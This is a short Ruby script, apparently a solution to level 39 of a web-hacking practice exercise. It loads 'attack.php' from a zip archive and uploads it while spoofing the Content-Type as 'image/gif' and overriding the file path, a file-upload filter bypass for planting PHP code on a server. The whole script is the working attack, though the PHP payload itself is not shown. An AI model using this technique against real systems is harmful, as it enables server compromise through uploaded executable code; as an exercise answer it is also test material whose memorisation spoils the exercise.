# encoding: utf-8
require 'tempfile'
require 'zip/zip'
require_relative 'hack_utils'

zip_path = File.join(File.dirname(File.expand_path(__FILE__)), 'take_39_attack.zip')
attack_code = Zip::ZipFile.open(zip_path){|zf| zf.read(zf.find_entry('attack.php')) }
begin
  f = Tempfile.new('8946')
  f.write attack_code
  f.pos=0
  def f.content_type
    'image/gif' # change Content-Type 
  end
  def f.path
    'attack.php'
  end
  params = { :input_file =>  f }
  HackUtils.post_answer(39, params)
ensure
  f.close!
end

